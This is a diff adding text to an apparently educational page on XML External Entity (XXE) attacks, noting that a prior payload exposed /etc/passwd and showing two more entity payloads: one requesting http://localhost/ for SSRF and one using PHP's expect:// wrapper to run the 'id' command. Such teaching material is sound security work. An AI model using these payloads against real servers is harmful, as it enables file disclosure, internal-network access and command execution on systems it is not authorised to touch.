@@ -277,3 +277,13 @@ Content-Type: application/xml<br><br>
       &lt;id>&xxe;&lt;/id><br>
   &lt;/user><br>
 </code>
+
+This way an attacker exposed the <code>/etc/passwd</code> from the server, which is obviously bad. Also an attacker can achieve SSRF this way:<br>
+<code>
+  &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://localhost/"> ]>
+</code><br>
+Command Injection also with the help of <a href="https://www.geeksforgeeks.org/protocols-and-wrapper-in-php/" target=_blank>PHP Wrappers</a>:<br>
+<code>
+  &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "expect://id"> ]>
+</code><br>
+ 
